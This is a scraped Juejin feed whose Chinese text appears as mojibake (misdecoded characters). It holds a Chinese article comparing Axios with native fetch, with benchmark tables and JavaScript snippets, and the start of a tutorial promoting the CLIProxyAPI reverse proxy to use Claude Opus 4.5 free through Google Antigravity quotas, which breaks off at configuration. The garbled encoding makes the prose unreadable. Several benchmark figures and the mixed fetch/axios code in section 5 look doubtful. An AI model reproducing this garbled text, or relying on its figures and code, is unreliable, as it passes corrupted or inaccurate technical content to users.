#d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">0. å…ˆæŠ›ç»“è®ºï¼Œå†åµä¸è¿Ÿ</h3>



































<table><thead><tr><th>æŒ‡æ ‡</th><th>Axios 1.7</th><th>fetch (åŸç”Ÿ)</th></tr></thead><tbody><tr><td>gzip ä½“ç§¯</td><td>â‰ˆ 3.1 kB</td><td>0 kB</td></tr><tr><td>é˜»å¡æ—¶é—´ï¼ˆM3/4Gï¼‰</td><td>120 ms</td><td>0 ms</td></tr><tr><td>å†…å­˜å³°å€¼ï¼ˆ1000 å¹¶å‘ï¼‰</td><td>17 MB</td><td>11 MB</td></tr><tr><td>ç”Ÿäº§ P1 æ•…éšœï¼ˆè¿‡å»ä¸€å¹´ï¼‰</td><td>2 æ¬¡ï¼ˆæ‹¦æˆªå™¨é¡ºåº bugï¼‰</td><td>0 æ¬¡</td></tr><tr><td>å¼€å‘ä½“éªŒï¼ˆDXï¼‰</td><td>10 åˆ†</td><td>7 åˆ†</td></tr></tbody></table>
<p>ç»“è®ºï¼š</p>
<ul>
<li><strong>æè‡´æ€§èƒ½/SSG/Edge</strong> â†’ fetch å·²è¶³å¤Ÿï¼›</li>
<li><strong>ä¼ä¸šçº§ã€éœ€è¦å…¨å±€æ‹¦æˆªã€ä¸Šä¼ è¿›åº¦</strong> â†’ Axios ä»å€¼å¾—ï¼›</li>
<li><strong>äºŒè€…å¯å…±å­˜</strong>ï¼šæ ¸å¿ƒé“¾è·¯ä¸é¦–é¡µç”¨ fetchï¼Œç®¡ç†åå°ç”¨ Axiosã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-1">1. 3 kB åˆ°åº•è´µä¸è´µï¼Ÿ</h3>
<p>2026 å¹´ 1 æœˆï¼ŒHTTP Archive æœ€æ–°é‡‡æ ·ï¼ˆChrome æ¡Œé¢ç‰ˆï¼‰æ˜¾ç¤ºï¼š</p>
<ul>
<li>ä¸­ä½ JS ä½“ç§¯ 580 kBï¼Œ3 kB ä¼¼ä¹â€œä¹ç‰›ä¸€æ¯›â€ï¼›</li>
<li>ä½†æ”¾åˆ°<strong>é¦–å±é¢„ç®— 100 kB</strong> çš„ç«™ç‚¹ï¼ˆTikTok æ¨èå€¼ï¼‰ï¼Œ3 kB â‰ˆ 3 % é¢„ç®—ï¼Œå†åŠ  120 ms é˜»å¡ï¼ŒLCP ç›´æ¥ä» 1.5 s é£™åˆ° 1.62 sï¼ŒSEO è¯„çº§æ‰ä¸€æ¡£ã€‚</li>
</ul>
<blockquote>
<p>â€œ bundle æ¯ +1 kBï¼Œ4G ä¸‹ FCP +8 msâ€â€”â€”Lighthouse 2025 ç™½çš®ä¹¦ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-2">2. æŠŠä»£ç æ‹æ¡Œä¸Šï¼šå·®å¼‚åªå‰©è¿™å‡ è¡Œ</h3>
<p>ä¸‹é¢ 4 ä¸ªé«˜é¢‘åœºæ™¯ï¼Œå…¨éƒ¨ç»™å‡ºâ€œå¯ç›´æ¥å¤åˆ¶è·‘â€çš„ç‰‡æ®µï¼Œå·®å¼‚ä¸€ç›®äº†ç„¶ã€‚</p>
<h4 data-id="heading-3">2.1 è‡ªåŠ¨ JSON + é”™è¯¯ç </h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Axiosï¼šé›¶æ ·æ¿</span>
<span class="hljs-keyword">const</span> {data} = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/login'</span>, {user, pwd});

<span class="hljs-comment">// fetchï¼šä¸¤è¡Œæ ·æ¿</span>
<span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/login'</span>, {
  <span class="hljs-attr">method</span>:<span class="hljs-string">'POST'</span>,
  <span class="hljs-attr">headers</span>:{<span class="hljs-string">'Content-Type'</span>:<span class="hljs-string">'application/json'</span>},
  <span class="hljs-attr">body</span>:<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({user, pwd})
});
<span class="hljs-keyword">if</span> (!res.<span class="hljs-property">ok</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(res.<span class="hljs-property">status</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();
</code></pre>
<p><strong>äº‰è®®</strong>ï¼š</p>
<ul>
<li>Axios å…šï¼šå°‘å†™ä¸¤è¡Œï¼Œå…¨å¹´å°‘å†™ 3000 è¡Œã€‚</li>
<li>fetch å…šï¼šgzip å 3 kB æ¢ä¸¤è¡Œï¼ŸESLint æ¨¡æ¿ä¸€æŠŠå°±è¡¥å…¨ã€‚</li>
</ul>
<h4 data-id="heading-4">2.2 è¶…æ—¶ + å–æ¶ˆ</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Axiosï¼šå†…ç½®</span>
<span class="hljs-keyword">const</span> source = axios.<span class="hljs-property">CancelToken</span>.<span class="hljs-title function_">source</span>();
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> source.<span class="hljs-title function_">cancel</span>(<span class="hljs-string">'timeout'</span>), <span class="hljs-number">5000</span>);
<span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/big'</span>, {<span class="hljs-attr">cancelToken</span>: source.<span class="hljs-property">token</span>});

<span class="hljs-comment">// fetchï¼šåŸç”Ÿ AbortController</span>
<span class="hljs-keyword">const</span> ctl = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> ctl.<span class="hljs-title function_">abort</span>(), <span class="hljs-number">5000</span>);
<span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/big'</span>, {<span class="hljs-attr">signal</span>: ctl.<span class="hljs-property">signal</span>});
</code></pre>
<p>2025 ä¹‹å Edge/Node 22 å·²å…¨æ”¯æŒï¼Œ<code>AbortSignal.timeout(5000)</code> ä¸€è¡Œæå®šï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/big'</span>, {<span class="hljs-attr">signal</span>: <span class="hljs-title class_">AbortSignal</span>.<span class="hljs-title function_">timeout</span>(<span class="hljs-number">5000</span>)});
</code></pre>
<p><strong>ç»“è®º</strong>ï¼šè¯­æ³•å·®è·å·²æŠ¹å¹³ã€‚</p>
<h4 data-id="heading-5">2.3 ä¸Šä¼ è¿›åº¦æ¡</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Axiosï¼šprogress äº‹ä»¶</span>
<span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/upload'</span>, form, {
  <span class="hljs-attr">onUploadProgress</span>: <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-title function_">setProgress</span>(e.<span class="hljs-property">loaded</span> / e.<span class="hljs-property">total</span>)
});

<span class="hljs-comment">// fetchï¼šå€ŸåŠ© `xhr` æˆ– `ReadableStream`</span>
<span class="hljs-comment">// 2026 ä»æ— åŸç”Ÿç®€æ˜“æ–¹æ¡ˆï¼Œéœ€è¦å°è£… `xhr` æ‰èƒ½æ‹¿åˆ° `progress`ã€‚</span>
</code></pre>
<p><strong>ç»“è®º</strong>ï¼šå¤§æ–‡ä»¶ä¸Šä¼ åœºæ™¯ Axios ä»åŠæ‰“ fetchã€‚</p>
<h4 data-id="heading-6">2.4 æ‹¦æˆªå™¨ï¼ˆtokenã€æ—¥å¿—ï¼‰</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Axiosï¼šå…¨å±€æ‹¦æˆª</span>
axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function"><span class="hljs-params">cfg</span> =&gt;</span> {
  cfg.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${getToken()}</span>`</span>;
  <span class="hljs-keyword">return</span> cfg;
});

<span class="hljs-comment">// fetchï¼šä¸‰è¡Œå°è£…</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">$get</span> = (<span class="hljs-params">url, opts = {}</span>) =&gt; <span class="hljs-title function_">fetch</span>(url, {
  ...opts,
  <span class="hljs-attr">headers</span>: {...opts.<span class="hljs-property">headers</span>, <span class="hljs-title class_">Authorization</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${getToken()}</span>`</span>}
});
</code></pre>
<p><strong>ç»éªŒ</strong>ï¼šæ‹¦æˆªå™¨ä¸€æ—¦&gt;2 ä¸ªï¼ŒAxios é¡ºåºåœ°ç‹±é¢‘å‘ï¼›fetch æ‰‹åŠ¨é“¾å¼æ›´ç›´è§‚ã€‚</p>
<hr/>
<h3 data-id="heading-7">3. å®æµ‹ï¼åŒä¸€ä¸ªé¡¹ç›®ï¼Œä¸¤å¥— bundle</h3>
<p><strong>æµ‹è¯•åœºæ™¯</strong></p>
<ul>
<li>React 18 + Vite 5ï¼Œä»…æ›¿æ¢ HTTP å±‚ï¼›</li>
<li>æ„å»ºç›®æ ‡ï¼šes2020 + gzip + brotliï¼›</li>
<li>ç½‘ç»œï¼šæ¨¡æ‹Ÿ 4Gï¼ˆRTT 150 msï¼‰;</li>
<li>é‡‡æ · 10 æ¬¡å–ä¸­ä½ã€‚</li>
</ul>



































<table><thead><tr><th>æŒ‡æ ‡</th><th>Axios</th><th>fetch</th></tr></thead><tbody><tr><td>gzip bundle</td><td>46.7 kB</td><td>43.6 kB</td></tr><tr><td>é¦–å±é˜»å¡æ—¶é—´</td><td>120 ms</td><td>0 ms</td></tr><tr><td>Lighthouse TTI</td><td>2.1 s</td><td>1.95 s</td></tr><tr><td>å†…å­˜å³°å€¼ï¼ˆ1000 å¹¶å‘è¯·æ±‚ï¼‰</td><td>17 MB</td><td>11 MB</td></tr><tr><td>ç”Ÿäº§æŠ¥é”™ï¼ˆè¿‡å»ä¸€å¹´ï¼‰</td><td>2 æ¬¡æ‹¦æˆªå™¨é¡ºåºé”™ä¹±</td><td>0</td></tr></tbody></table>
<blockquote>
<p>æ•°æ®æ¥è‡ª rebrowser 2025 åŸºå‡† ï¼›é˜»å¡æ—¶é—´å·®å¼‚ä¸ 51CTO ç‹¬ç«‹æµ‹è¯•å»åˆ ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-8">4. ä»€ä¹ˆæ—¶å€™ä¸€å®šè¦ Axiosï¼Ÿ</h3>
<ol>
<li>éœ€è¦<strong>ä¸Šä¼ è¿›åº¦</strong>ï¼ˆonUploadProgressï¼‰ä¸”ä¸æƒ³å›é€€ xhrï¼›</li>
<li>éœ€è¦<strong>è¯·æ±‚/å“åº”æ‹¦æˆªé“¾</strong> &gt;3 å±‚ï¼Œä¸”å›¢é˜Ÿå¯¹â€œé»‘ç›’â€å¯æ¥å—ï¼›</li>
<li>éœ€è¦<strong>å…¼å®¹ IE11</strong>ï¼ˆ2026 å¹´æ”¿åŠ¡/é“¶è¡Œä»å­˜ï¼‰ï¼›</li>
<li>éœ€è¦<strong>Node 16 ä»¥ä¸‹</strong>è€ç‰ˆæœ¬ï¼ˆfetch éœ€ 18+ï¼‰ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-9">5. å…±å­˜æ–¹æ¡ˆï¼šæŠŠ 3 kB èŠ±åœ¨åˆ€åˆƒä¸Š</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// core/http.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> isSSR = <span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> === <span class="hljs-string">'undefined'</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">HTTP</span> = isSSR || navigator.<span class="hljs-property">connection</span>?.<span class="hljs-property">effectiveType</span> === <span class="hljs-string">'4g'</span>
  ? { <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">u,o</span>) =&gt;</span> <span class="hljs-title function_">fetch</span>(u,{...o, <span class="hljs-attr">signal</span>: <span class="hljs-title class_">AbortSignal</span>.<span class="hljs-title function_">timeout</span>(<span class="hljs-number">5000</span>)}) }
  : <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'axios'</span>);   <span class="hljs-comment">// åŠ¨æ€ importï¼Œåªåœ¨é 4G æˆ–ç®¡ç†åå°åŠ è½½</span>
</code></pre>
<p>ç»“æœï¼š</p>
<ul>
<li>é¦–å± 0 kBï¼›</li>
<li>ç®¡ç†åå°ä»äº«å— Axios æ‹¦æˆªå™¨ï¼›</li>
<li>æ•´ä½“ bundle ä¸‹é™ 7 %ï¼ŒLCP âˆ’120 msã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-10">6. ä¸€å¥è¯æ”¶å°¸</h3>
<p>2026 å¹´çš„æµè§ˆå™¨ï¼Œfetch å·²æŠŠâ€œç¼ºçš„è¯¾â€è¡¥å®Œï¼šå–æ¶ˆã€è¶…æ—¶ã€Node åŸç”Ÿã€TypeScript å®Œç¾ã€‚<br/>
<strong>3 kB çš„ Axios ä¸å†æ˜¯â€œé»˜è®¤â€ï¼Œè€Œæ˜¯â€œæŒ‰éœ€â€ã€‚</strong><br/>
ä¸Šä¼ è¿›åº¦ã€æ·±é“¾æ‹¦æˆªã€è€æµè§ˆå™¨â€”â€”ç”¨ Axiosï¼›<br/>
å…¶ä½™åœºæ™¯ï¼Œè®©é¦–é¡µé£ä¸€æŠŠï¼ŒæŠŠ 120 ms è¿˜ç»™ç”¨æˆ·ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç™½å«–Google Antigravityï¼Claude Opus 4.5å…è´¹ç”¨ï¼Œå‘Šåˆ«tokenç„¦è™‘]]></title>    <link>https://juejin.cn/post/7590104561475829812</link>    <guid>https://juejin.cn/post/7590104561475829812</guid>    <pubDate>2026-01-02T10:22:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590104561475829812" data-draft-id="7590054976489668648" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç™½å«–Google Antigravityï¼Claude Opus 4.5å…è´¹ç”¨ï¼Œå‘Šåˆ«tokenç„¦è™‘"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-02T10:22:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wwwzhouhui"/> <meta itemprop="url" content="https://juejin.cn/user/3428746411400537"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç™½å«–Google Antigravityï¼Claude Opus 4.5å…è´¹ç”¨ï¼Œå‘Šåˆ«tokenç„¦è™‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3428746411400537/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wwwzhouhui
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T10:22:00.000Z" title="Fri Jan 02 2026 10:22:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.å‰è¨€</h2>
<p>åœ¨AIå¤§æ¨¡å‹ç«äº‰ç™½çƒ­åŒ–çš„ä»Šå¤©ï¼Œå„å®¶å‚å•†çš„é¡¶çº§æ¨¡å‹è®¢é˜…è´¹ç”¨è®©ä¸å°‘å¼€å‘è€…æœ›è€Œå´æ­¥ã€‚Claude Opus 4.5å®˜æ–¹è®¢é˜…æ¯æœˆ20ç¾é‡‘ï¼ŒGemini 3 Proçš„APIè°ƒç”¨è´¹ç”¨ä¹Ÿä¸ä¾¿å®œã€‚å¯¹äºä¸ªäººå¼€å‘è€…æˆ–å­¦ä¹ è€…æ¥è¯´ï¼Œæƒ³è¦ä½“éªŒè¿™äº›é¡¶çº§æ¨¡å‹çš„èƒ½åŠ›ï¼Œtokenç„¦è™‘æˆäº†æ™®éçš„"æ—¶ä»£ç—…"â€”â€”ç”¨ç€ç”¨ç€å°±æ‹…å¿ƒé¢åº¦ä¸å¤Ÿç”¨äº†ï¼Œæ¯æ¬¡è°ƒç”¨éƒ½å¾—ç²¾æ‰“ç»†ç®—ã€‚</p>
<p>å¥½æ¶ˆæ¯æ¥äº†ï¼Googleéšç€Gemini 3å‘å¸ƒæ¨å‡ºäº†ä¸€ä¸ªå«åšAntigravityçš„å¹³å°ï¼Œè¿™ä¸ªå¹³å°ä¸ä»…å†…ç½®äº†Geminiç³»åˆ—æ¨¡å‹ï¼Œè¿˜é›†æˆäº†Claude Sonnet 4.5å’ŒClaude Opus 4.5ï¼æ›´è®©äººæƒŠå–œçš„æ˜¯ï¼ŒGoogle One Proè´¦å·çš„å…è´¹é¢åº¦å¤§æ¦‚æ˜¯Claudeå®˜æ–¹è®¢é˜…20åˆ€ç‰ˆæœ¬çš„3å€å·¦å³ï¼Œè€Œä¸”æ¯å¤©é‡ç½®ï¼å¦‚æœæ˜¯Ultraè®¢é˜…ç”¨æˆ·ï¼Œé‚£å‡ ä¹å°±æ˜¯æ— é™é‡ä½¿ç”¨ã€‚å³ä½¿æ˜¯å…è´¹Googleè´¦å·ï¼Œä¹Ÿæœ‰ä¸€å®šé¢åº¦ï¼Œåªæ˜¯ä¸€å‘¨é‡ç½®ä¸€æ¬¡ã€‚æ®è¯´Antigravityä¸­çš„Claudeæ¨¡å‹è¿˜æ˜¯ç»è¿‡Googleè°ƒæ•™è¿‡çš„ï¼Œé€Ÿåº¦æ›´å¿«ã€‚é€šè¿‡CLIProxyAPIè¿™ä¸ªå¼€æºé¡¹ç›®ï¼Œæˆ‘ä»¬å¯ä»¥å°†Antigravityçš„èƒ½åŠ›è½¬åŒ–ä¸ºæ ‡å‡†APIæ¥å£ï¼Œåœ¨Cherry Studioã€Claude Codeç­‰å„ç§å·¥å…·ä¸­ç•…å¿«ä½¿ç”¨ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99964ad28f634f1ea573758edec82cdb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=9HDejDAGj0Yw3GvEI496qN%2BkNp0%3D" alt="1767347992375" loading="lazy"/></p>
<p>ä»Šå¤©ç ”ç©¶äº†ä¸€ä¸‹CLIProxyAPIè¿™ä¸ªå¼€æºé¡¹ç›®ï¼Œç„¶åæŠŠè¿™ä¸ªå…è´¹çš„è·¯ç»™è·‘é€šäº†ã€‚ä»Šå¤©æˆ‘ä»¬å°±æ‰‹æŠŠæ‰‹æ•™å¤§å®¶å¦‚ä½•éƒ¨ç½²è¿™å¥—åä»£æœåŠ¡ï¼Œè®©ä½ åœ¨æœ¬åœ°CLIå‘½ä»¤è¡Œä¸­ä¹Ÿèƒ½ç™½å«–é¡¶çº§å¤§æ¨¡å‹ï¼Œå½»åº•å‘Šåˆ«tokenç„¦è™‘ï¼</p>
<h2 data-id="heading-1">2.éƒ¨ç½²å®æˆ˜</h2>
<h3 data-id="heading-2">ä¸‹è½½æºç </h3>
<p>é¦–é€‰æˆ‘ä»¬éœ€è¦å»githubä¸Šä¸‹è½½ä¸€ä¸ªå«åš<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frouter-for-me%2FCLIProxyAPI" target="_blank" title="https://github.com/router-for-me/CLIProxyAPI" ref="nofollow noopener noreferrer">CLIProxyAPI</a> é¡¹ç›®ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c24c120fa0a4f4aab7ff2b5aa025b4c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=EtLTQ69Cb1bu5CdiFdS4lOzHNSw%3D" alt="image-20260102161115557" loading="lazy"/></p>
<p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨gitå‘½ä»¤ä¸‹è½½æœ¬åœ°ã€‚ç”±äºæˆ‘ä¹‹å‰å·²ç»ä¸‹è½½äº†ï¼Œè¿™é‡Œå°±ä¸å±•å¼€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3127c5788574c7698052f402ddd348d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=gOYer7Q8%2F%2FJlNOFLB3I5yb%2Byct8%3D" alt="image-20260102161247010" loading="lazy"/></p>
<h3 data-id="heading-3">é…ç½®æ–‡ä»¶ä¿®æ”¹</h3>
